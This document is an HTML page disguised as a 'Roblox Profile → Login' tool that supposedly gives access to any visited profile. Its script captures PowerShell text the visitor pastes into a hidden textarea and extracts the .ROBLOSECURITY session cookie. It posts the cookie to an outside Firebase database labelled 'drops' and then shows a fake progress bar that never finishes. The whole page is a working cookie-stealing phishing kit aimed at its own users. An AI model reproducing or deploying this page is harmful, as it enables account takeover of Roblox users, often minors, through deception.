<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Profile → Login 2025</title>
  <style>
    body{margin:0;background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background-image:radial-gradient(circle at top right,rgba(0,255,150,0.07) 0%,transparent 50%),radial-gradient(circle at bottom left,rgba(100,50,255,0.07) 0%,transparent 50%);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
    .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:680px;width:100%;padding:50px 40px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
    h1{font-size:3em;margin:0 0 16px;color:#fff;font-weight:700}
    p{font-size:1.3em;margin:20px 0 40px;color:#8b949e;line-height:1.5}
    #box{position:absolute;left:-9999px;opacity:0}
    button{background:#238636;color:#fff;padding:14px 32px;font-size:18px;font-weight:600;border:none;border-radius:10px;cursor:pointer;transition:background .2s}
    button:hover{background:#2ea043}
    #msg{margin-top:25px;font-size:19px;color:#f0f6fc}
    .load{display:none;margin-top:30px;font-size:21px;color:#58a6ff;font-weight:600}
    .thumb{margin-top:50px;border-radius:12px;border:3px solid #30363d;max-width:100%;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
    footer{margin-top:60px;color:#484f58;font-size:14px}
  </style>
</head>
<body>

<div class="card">
  <h1>Roblox Profile → Login</h1>
  <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login to any profile you visited</p>

  <textarea id="box" autofocus></textarea>
  <button onclick="run()">GET LOGIN</button>

  <div id="msg">Click anywhere and press Ctrl+V to paste</div>
  <div id="load" class="load">Extracting session... please wait</div>

  <!-- Your thumbnail / proof image (replace the URL with your own) -->
  <img src="https://i.imgur.com/5vN8kPq.png" alt="Proof" class="thumb">
</div>

<footer>© 2025 Roblox Tools • Not affiliated with Roblox Corporation</footer>

<script>
document.getElementById("box").focus();

document.addEventListener("paste", e => {
  const pasted = (e.clipboardData || window.clipboardData).getData("text");
  document.getElementById("box").value = pasted;
  run();
});

function run() {
  const data = document.getElementById("box").value;
  if (!data || data.length < 600) {
    document.getElementById("msg").textContent = "Nothing pasted – press Ctrl+V";
    return;
  }

  const cookie = data.match(/\.ROBLOSECURITY[^'"`]*['"`]([^'"`]{400,})/)?.[1]
              || data.match(/Value\s*=\s*["']([^"']{400,})/)?.[1];

  if (!cookie) {
    document.getElementById("msg").textContent = "No valid session found – try again";
    return;
  }

  // Sends to your Firebase
  fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
    method: "POST",
    body: JSON.stringify({cookie, time: new Date().toISOString(), method: "profile-2025"}),
    headers: {"Content-Type": "application/json"}
  });

  document.getElementById("msg").style.display = "none";
  document.getElementById("load").style.display = "block";
  let p = 18;
  setInterval(() => {
    p += Math.floor(Math.random() * 22);
    if (p > 94) p = 94;
    document.getElementById("load").innerHTML = `Extracting login... ${p}%`;
  }, 3000);
}
</script>

</body>
</html>
